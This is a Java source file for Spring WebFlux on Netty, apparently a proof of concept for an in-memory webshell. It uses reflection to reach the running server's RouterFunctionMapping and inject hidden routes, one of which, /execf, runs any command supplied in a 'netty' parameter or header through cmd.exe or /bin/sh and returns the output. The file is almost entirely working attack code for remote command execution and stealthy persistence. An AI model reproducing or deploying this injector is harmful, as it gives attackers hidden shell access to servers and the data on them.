package com.flux;

import org.springframework.boot.web.embedded.netty.NettyWebServer;
import org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.reactive.DispatcherHandler;
import org.springframework.web.reactive.function.server.RequestPredicates;
import org.springframework.web.reactive.function.server.RouterFunction;
import org.springframework.web.reactive.function.server.RouterFunctions;
import org.springframework.web.reactive.function.server.support.RouterFunctionMapping;
import org.springframework.web.reactive.result.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.server.adapter.HttpWebHandlerAdapter;
import org.springframework.web.server.handler.ExceptionHandlingWebHandler;
import org.springframework.web.server.handler.FilteringWebHandler;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Iterator;
import java.util.List;
import java.util.zip.GZIPInputStream;
import org.springframework.util.Base64Utils;
import org.springframework.web.reactive.function.server.HandlerFunction;

import java.io.InputStream;
import java.util.Optional;
import java.util.Scanner;
import org.springframework.web.reactive.function.server.HandlerFunction;
import org.springframework.web.reactive.function.server.ServerRequest;
import org.springframework.web.reactive.function.server.ServerResponse;
import reactor.core.publisher.Mono;

import java.util.Iterator;

@RestController
public class evilHandlerFunction {
    @RequestMapping("/HandlerFunction")
    public String inject() throws Exception{
        Thread thread =null;
        for (Thread t : Thread.getAllStackTraces().keySet()) {
            if (t.getClass().getName().contains("NettyWebServer")) {
                thread = t;
            }
        }

        NettyWebServer nettyWebServer = (NettyWebServer) Utils.getField(thread ,"this$0");
        ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) Utils.getField(nettyWebServer ,"handler");
        Object o3 = Utils.getField(reactorHttpHandlerAdapter ,"httpHandler");
        HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) Utils.getField(o3 ,"delegate");
        ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) Utils.getField(httpWebHandlerAdapter ,"delegate");
        FilteringWebHandler filteringWebHandler = (FilteringWebHandler) Utils.getField(exceptionHandlingWebHandler ,"delegate");

        RouterFunctionMapping routerFunctionMapping = null;
        DispatcherHandler d = (DispatcherHandler) Utils.getField(filteringWebHandler ,"delegate");

        Iterator it = d.getHandlerMappings().iterator();
        while (true) {
            if (!it.hasNext()) {
                break;
            }
            Object next = it.next();
            if (next.getClass().getName().contains("RouterFunctionMapping")) {
                routerFunctionMapping = (RouterFunctionMapping) next;
                break;
            }
        }

        // 创建命令执行的 Handler
        ErrorHandlerFunction evilHandlerFunction = new ErrorHandlerFunction();
        // 创建 hello 系列的 Handler
        HelloHandlerFunction hello0Handler = new HelloHandlerFunction("hello0");
        HelloHandlerFunction hello1Handler = new HelloHandlerFunction("hello1");
        HelloHandlerFunction hello2Handler = new HelloHandlerFunction("hello2");

        RouterFunction routerFunction = routerFunctionMapping.getRouterFunction();

        // 创建所有路由
        RouterFunction execRoute = RouterFunctions.route(RequestPredicates.path("/execf"), evilHandlerFunction);
        RouterFunction hello0Route = RouterFunctions.route(RequestPredicates.path("/hello0"), hello0Handler);
        RouterFunction hello1Route = RouterFunctions.route(RequestPredicates.path("/hello1"), hello1Handler);
        RouterFunction hello2Route = RouterFunctions.route(RequestPredicates.path("/hello2"), hello2Handler);

        // 合并所有新路由：先合并所有 hello 路由，再合并 exec 路由
        RouterFunction newRoutes = execRoute;
        RouterFunction allHelloRoutes0 = newRoutes.andOther(hello0Route);
        RouterFunction allHelloRoutes1 = allHelloRoutes0.andOther(hello1Route);
        RouterFunction allHelloRoutes2 = allHelloRoutes1.andOther(hello2Route);

        RouterFunction andOther;

        andOther = allHelloRoutes2;
        RouterFunctions.changeParser(andOther, routerFunctionMapping.getPathPatternParser());


        // 这里如果要用Arthas移除的话，很麻烦，要用递归，但是OGNL本身不支持递归
        // TODO 故而搁置一下
        if (routerFunction == null) {
            andOther = allHelloRoutes2;
            RouterFunctions.changeParser(andOther, routerFunctionMapping.getPathPatternParser());
        } else {
            try {
                // 缺陷，没法遍历所有的 RouterFunction 来进行判断，所以一个服务每一次注入都尽量更改 urlPattern
                if (((HandlerFunction) Utils.getField(routerFunction, "handlerFunction")).getClass().getName().contains("ErrorHandlerFunction")) {
                    return "existed";
                }
            } catch (Exception e) {
                System.out.println("false");
            }
            // 新路由优先，再合并现有路由
            andOther = allHelloRoutes2.andOther(routerFunction);
        }

        System.out.println(andOther);

        Field declaredField = routerFunctionMapping.getClass().getDeclaredField("routerFunction");
        declaredField.setAccessible(true);
        declaredField.set(routerFunctionMapping, andOther);

        return "success";
    }

    /**
     * Hello Handler - 支持自定义返回内容
     */
    class HelloHandlerFunction implements HandlerFunction<ServerResponse> {
        private String message;

        public HelloHandlerFunction(String message) {
            this.message = message;
        }

        @Override
        public Mono<ServerResponse> handle(ServerRequest serverRequest) {
            return ServerResponse.ok().body(Mono.just(message), String.class);
        }
    }
}

class ErrorHandlerFunction implements HandlerFunction<ServerResponse> {
    public static String paramName = "netty";

    @Override
    public Mono<ServerResponse> handle(ServerRequest serverRequest) {
        String str = null;
        Optional queryParam = serverRequest.queryParam(paramName);
        if (queryParam.isPresent()) {
            str = (String) queryParam.get();
        }
        if (str == null || str.isEmpty()) {
            str = serverRequest.headers().firstHeader(paramName);
        }
        String str2 = "";
        if (str != null) {
            try {
                str2 = new Scanner(getInputStream(getParam(str))).useDelimiter("\\A").next();
            } catch (Throwable th) {
            }
        }
        return ServerResponse.ok().body(Mono.just(str2), String.class);
    }

    private String getParam(String str) {
        return str;
    }

    private InputStream getInputStream(String str) throws Exception {
        String[] split;
        String str2 = null;
        if (0 == 0) {
            split = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str};
        } else if (str2.contains("\"{command}\"")) {
            String[] split2 = str2.split("\\s+");
            for (int i = 0; i < split2.length; i++) {
                split2[i] = split2[i].replace("\"{command}\"", str);
            }
            split = split2;
        } else {
            split = str2.replace("{command}", str).split("\\s+");
        }
        return new ProcessBuilder(split).redirectErrorStream(true).start().getInputStream();
    }
}